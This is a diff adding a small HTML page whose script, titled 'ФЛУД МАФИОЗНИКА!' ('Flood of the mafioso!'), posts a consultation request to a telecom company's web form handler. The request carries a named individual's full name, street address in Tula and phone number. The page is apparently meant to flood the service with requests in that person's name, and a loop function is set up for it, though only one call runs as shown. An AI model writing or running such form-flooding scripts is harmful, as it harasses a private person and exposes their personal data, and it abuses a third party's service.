@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Document</title>
+	<script src="js/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+
+	<p>ФЛУД МАФИОЗНИКА!</p>
+	
+	<script>
+
+		if (window.jQuery) {
+		  console.log('jQuery here!!!');
+		}else{
+			console.log('jQuery NOT here!!!');
+		}
+
+		function sendRequest(data_obj) {
+			$.ajax({
+                url: 'https://mts-home.com/wp-content/themes/red/mail1r.php?action=mail2r',
+                headers: {
+                    'Access-Control-Allow-Origin:':'*',
+                    'Content-Type':'application/json; charset=utf-8'
+                },
+                method: 'POST',
+                dataType: 'json',
+                crossDomain: true,
+                data: data_obj,
+                success: function(data){
+                  console.log('succes: ');
+                  console.log(data);
+                },
+                error: function (jqXHR, exception) {
+                  console.log('error function');
+
+                  var msg = '';
+                  if (jqXHR.status === 0) {
+                      msg = 'Not connect.\n Verify Network.';
+                  } else if (jqXHR.status == 404) {
+                      msg = 'Requested page not found. [404]';
+                  } else if (jqXHR.status == 500) {
+                      msg = 'Internal Server Error [500].';
+                  } else if (exception === 'parsererror') {
+                      msg = 'Requested JSON parse failed.';
+                  } else if (exception === 'timeout') {
+                      msg = 'Time out error.';
+                  } else if (exception === 'abort') {
+                      msg = 'Ajax request aborted.';
+                  } else {
+                      msg = 'Uncaught Error.\n' + jqXHR.responseText;
+                  }
+                  console.log('msg');
+                  console.log(msg);
+
+                  
+                  console.log('jqXHR');
+                  console.log(jqXHR);
+
+                  console.log('exception');
+                  console.log(exception);
+                    // Your error handling logic here..
+                }
+            });
+		}
+
+		function startLoop(cnt) {
+
+			var data_obj = {
+				region__consult:'',
+				region__id:'',
+				campaign__id:'79697778587',
+				region__name:'',
+				region__city:'',
+				popup__cons_apart:'on',
+				request__surname:'Антонов',
+				request__name:'Максим',
+				request__middle_name:'Николаевич',
+				request__address:'г Тула, ул Максима Горького, д 20',
+				request__dadata__address:'',
+				request__phone:'+7(968) 488-44-91'
+			};
+
+			sendRequest(data_obj);
+		}
+		
+		
+		startLoop(1);
+
+	</script>
+
+</body>
+</html>
